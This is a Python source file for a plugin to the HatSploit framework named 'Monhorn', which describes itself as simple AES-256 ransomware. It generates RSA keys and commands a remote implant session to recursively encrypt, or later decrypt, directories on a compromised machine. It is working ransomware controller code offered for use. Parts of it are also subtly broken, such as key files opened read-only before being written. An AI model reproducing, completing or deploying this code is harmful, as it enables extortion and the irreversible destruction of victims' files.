"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import sys
import time

from pwny.api import *
from pwny.types import *

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

from hatsploit.lib.plugin import Plugin


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Monhorn Plugin",
            'Plugin': "monhorn",
            'Authors': [
                'Ivan Nikolsky (enty8080) - plugin developer'
            ],
            'Description': "Simple AES-256 ransomware."
        }

        self.commands = {
            'essential': {
                'encrypt': {
                    'Description': "Encrypt directory recursively.",
                    'Usage': "encrypt <path>",
                    'MinArgs': 1
                },
                'decrypt': {
                    'Description': "Decrypt directory recursevely.",
                    'Usage': "decrypt <path> <private_key>",
                    'MinArgs': 2
                }
            },
        }

        self.disclaimer = (
            "It is highly recommended to save crypto keys.\n"
            "    If saved, encryption process can be reverted.\n"
            "    Otherwise, encryption will be permanent.\n"
            "    Please, acknowledge this information to avoid data loss."
        )

        self.pubkey = None
        self.privkey = None

        self.encrypt_tag = tlv_custom(API_CALL_DYNAMIC, 2, API_CALL)
        self.decrypt_tag = tlv_custom(API_CALL_DYNAMIC, 2, API_CALL + 1)

    @staticmethod
    def update_progress(progress):
        bar_length = 23
        status = "({}%)".format(str(progress)[2:4])

        if progress >= 1.0:
            progress = 1
            status = "COMPLETE"

        block = int(round(bar_length * progress))
        text = "\r{0}\t\t{1}".format("#" * block + " " * (bar_length - block), status)

        time.sleep(0.5)

        sys.stdout.write(text)
        sys.stdout.flush()

    def generate_keys(self):
        self.print_empty("Generating keys")
        self.update_progress(0)

        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        pem_private_key = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

        self.update_progress(0.5)

        public_key = private_key.public_key()
        pem_public_key = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        self.update_progress(1)

        return pem_private_key, pem_public_key

    def preserve_keys(self, privkey, pubkey):
        if self.privkey:
            with open(self.privkey, 'r') as f:
                f.write(privkey)

        if self.pubkey:
            with open(self.pubkey, 'r') as f:
                f.write(pubkey)

    def encrypt(self, argc, argv):
        self.print_empty("Executing Monhorn")

        privkey, pubkey = self.generate_keys()
        self.preserve_keys(privkey, pubkey)

        self.print_empty("\n")
        self.print_empty("Beginning crypto operations")

        self.session.send_command(
            tag=self.encrypt_tag,
            args={
                TLV_TYPE_BYTES: pubkey,
                TLV_TYPE_STRING: argv[1]
            },
            plugin=self.plugin
        )

        self.print_empty("Finished all crypto operations.")

    def decrypt(self, argc, argv):
        self.print_empty("Executing Monhorn")

        with open(argv[2], 'rb') as f:
            self.print_empty("\nBeginning crypto operations")

            self.session.send_command(
                tag=self.decrypt_tag,
                args={
                    TLV_TYPE_BYTES: f.read(),
                    TLV_TYPE_STRING: argv[1]
                },
                plugin=self.plugin
            )

            self.print_empty("Finished all crypto operations.")

    def load(self):
        self.print_warning(self.disclaimer)

        if self.input_question('Preserve keys? [n/Y] ')[0].lower() in ['yes', 'y']:
            self.privkey = self.input_arrow('Where to save private key? ')[0]
            self.pubkey = self.input_arrow('Where to save public key? ')[0]

            self.print_information(f'Private key will be saved here: {self.privkey}')
            self.print_information(f'Public key will be saved here: {self.pubkey}')
